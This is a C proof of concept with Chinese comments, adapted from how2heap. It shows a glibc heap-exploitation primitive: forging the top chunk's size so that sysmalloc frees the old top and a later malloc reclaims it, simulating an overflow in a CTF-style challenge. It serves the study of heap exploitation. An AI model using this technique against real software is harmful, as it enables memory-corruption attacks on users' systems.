#define _GNU_SOURCE

#include <assert.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/*
 * glibc 2.23～2.43 / x86-64：让 sysmalloc 间接释放旧 top。
 *
 * 这份 PoC 源于 how2heap 的 sysmalloc_int_free 思路，改成中文逐步说明。
 * 它直接改 top.size 来模拟题目中的 heap overflow/OOB。
 */

#define SIZE_SZ            (sizeof(size_t))
#define CHUNK_HEADER_SIZE  (2 * SIZE_SZ)
#define MALLOC_ALIGNMENT   0x10UL
#define ALIGN_DOWN(value)  ((value) & ~(MALLOC_ALIGNMENT - 1))

/* sysmalloc 在旧 top 尾部留下两份 header，作为阻止跨区域合并的 fencepost。 */
#define FENCEPOST_BYTES    (2 * CHUNK_HEADER_SIZE)

/* 希望 sysmalloc 送入 _int_free 的物理 chunk 大小。 */
#define FREED_CHUNK_SIZE   0x150UL
#define FREED_REQUEST      (FREED_CHUNK_SIZE - CHUNK_HEADER_SIZE)

int main(void)
{
    long page_size;
    size_t page_mask;
    size_t first_top_size;
    size_t padding_request;
    size_t forged_top_size;
    size_t expected_freed_size;
    size_t *top_size_field;
    unsigned char *probe;
    unsigned char *padding;
    unsigned char *high_allocation;
    unsigned char *reclaimed;

    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    page_size = sysconf(_SC_PAGESIZE);
    assert(page_size > 0 && (page_size & (page_size - 1)) == 0);
    page_mask = (size_t)page_size - 1;
    assert((FREED_CHUNK_SIZE & (MALLOC_ALIGNMENT - 1)) == 0);

    /*
     * malloc(0x10) 对应物理 size=0x20。用户区后一个 size_t 就是新 top.size，
     * 因此 probe[3]（以 size_t 为单位）可读到它。这里只是教学探测手段。
     */
    probe = malloc(0x10);
    assert(probe != NULL);
    first_top_size = ((size_t *)probe)[3];

    /*
     * 消耗 top，目标是让下一块 top 的真实末端落在 page 边界，并使其低位大小
     * 可以缩成 0x170：0x20 fencepost + 0x150 freed chunk。
     */
    padding_request = first_top_size
                    - CHUNK_HEADER_SIZE
                    - (2 * MALLOC_ALIGNMENT)
                    - FREED_CHUNK_SIZE;
    padding_request &= page_mask;
    padding_request = ALIGN_DOWN(padding_request);
    assert(padding_request >= MALLOC_ALIGNMENT);

    padding = malloc(padding_request);
    assert(padding != NULL);

    /* padding 后紧邻 top：末尾考虑对齐后的一个 size_t 即 top.size。 */
    top_size_field = (size_t *)(padding + padding_request
                               - SIZE_SZ + MALLOC_ALIGNMENT);
    first_top_size = *top_size_field;

    /*
     * 漏洞点：只保留当前 top.size 在页面内的低位。
     * size 本身带 PREV_INUSE 位，因此这里通常得到 0x181，而物理大小为 0x180。
     */
    forged_top_size = first_top_size & page_mask;
    *top_size_field = forged_top_size;

    expected_freed_size = ALIGN_DOWN(forged_top_size - FENCEPOST_BYTES);
    assert(expected_freed_size == FREED_CHUNK_SIZE);

    /*
     * 请求超过伪 top 的余量，迫使 _int_malloc 进入 sysmalloc。
     * 新内存区域位于更高地址；旧 top 扣掉 fencepost 后被 _int_free。
     */
    high_allocation = malloc(FREED_CHUNK_SIZE + 0x10);
    assert(high_allocation != NULL);

    /* 再申请 0x140，应从刚被释放的 0x150 旧 top chunk 返回低地址。 */
    reclaimed = malloc(FREED_REQUEST);
    assert(reclaimed != NULL);
    assert(reclaimed < high_allocation);

    puts("[+] sysmalloc：旧 top 已释放");
    return 0;
}
